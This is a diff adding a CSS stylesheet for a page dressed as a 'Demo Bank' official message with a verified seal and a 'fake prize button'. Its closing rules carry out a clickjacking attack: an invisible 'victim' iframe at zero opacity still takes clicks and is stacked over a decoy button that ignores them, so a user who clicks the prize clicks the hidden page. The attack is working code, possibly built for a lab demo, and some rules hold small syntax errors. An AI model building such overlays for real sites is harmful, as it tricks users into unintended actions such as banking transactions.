@@ -1,0 +1,179 @@
+body {
+    margin: 90px;
+    background-color: #fdf7fb;
+    font-family: "Merriweather";
+    text-align: center;
+}
+
+
+.premium-header {
+    font-family: 'Inter', sans-serif;
+    margin-top: 60px;
+    font-size: 40px;
+    font-weight: 800;
+    text-align: center;
+    color: #2d1b25;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+}
+
+.premium-header span {
+    color: #8a5473;
+}
+
+.premium-header .sub {
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    font-weight:600;
+    letter-spacing: 1px;
+    margin-top: 6px;
+    color: #6f4c5d;
+    text-tranform:uppercase;
+}
+
+.premium-header .sub2 {
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    color: #8a5473;
+    margin-top: 10px;
+}
+
+.big-thankyou {
+    font-family: 'Inter';
+    font-size: 18px;
+    font-weight: 700;
+    color: #a06684;  /* beautiful pink like your title */
+    text-align: center;
+    margin-bottom: 0px;
+    margin-top: 5px;
+    letter-spacing: 0.3px;
+    text-transform= uppercase;
+}
+
+.big-message {
+    font-size: 20px;
+    font-weight: 700;
+    color: #6f3f5a; /* elegant pink-purple tone matching your header */
+    margin-bottom: 20px;
+    text-align: center;
+    line-height: 1.4;
+}
+
+
+
+.subcard {
+    font-size: 20px;
+    font-weight: 600;
+    color: #5a4a52;
+    margin-bottom: 20px;
+    text-align: center;
+}
+
+
+/* ===============================
+   DEMO BANK OFFICIAL MESSAGE BOX
+   ===============================
+
+/* Tagline under header */
+.tagline {
+    text-align: center;
+    font-size: 16px;
+    margin-top: 10px;
+    margin-bottom: 40px;
+    color: #6a5060;
+    line-height: 1.5;
+    animation: fadeIn 0.8s ease-out;
+}
+
+/* Verified seal */
+.bank-seal {
+    display: inline-block;
+    padding: 6px 14px;
+    background-color: #f4eef5;
+    border: 1px solid #d5becd;
+    border-radius: 8px;
+    font-size: 14px;
+    color: #5a3f4b;
+    margin-bottom: 15px;
+    font-weight: bold;
+    animation: fadeIn 1s ease-out;
+}
+
+
+.bank-card {
+    background: #ffffff;
+    max-width: 750px;
+    margin: 35px auto;
+    padding: 20px 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.1);
+    text-align: center;
+    line-height: 1.7;
+    font-size: 16px;
+    border: 2px solid #e8d3df; /* soft pink border */
+}
+
+/* ===========================
+   BOTTOM BOX FOR BANK MESSAGE
+   =========================== */
+.box-bottom {
+    font-size: 16px;
+    cursor:pointer;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    background: #ffffff;
+    max-width: 750px;
+    margin: 140px auto 20px auto;  /* pushes it DOWN under button */
+    padding: 40px 40px;
+    border-radius: 12px;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.1);
+    text-align: center;
+    line-height: 1.7;
+    font-size: 16px;
+    z-index: 5;
+    position: relative;
+}
+
+
+/* Fake prize button -- aligned with victim real button */
+#prize-btn {
+    font-family: 'Inter', sans-serif;
+    font-size: 20px;
+    font-weight:700;
+
+    position: absolute;
+    top: 460px;  /* FIXED alignment */
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 20px 60px;
+    background: linear-gradient(180deg, #c08aa3 0%, #a86f8b 100%);
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 24px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 5;
+    pointer-events: none;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+
+#prize-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+}
+
+
+/* Invisible victim iframe */
+#victim-frame {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 1600px; /* IMPORTANT: prevent overflow */
+    border: none;
+
+    opacity: 0; /* hides the victim page */
+    pointer-events: auto; /* still receives click */
+    z-index: 10; /* under fake button */
+}
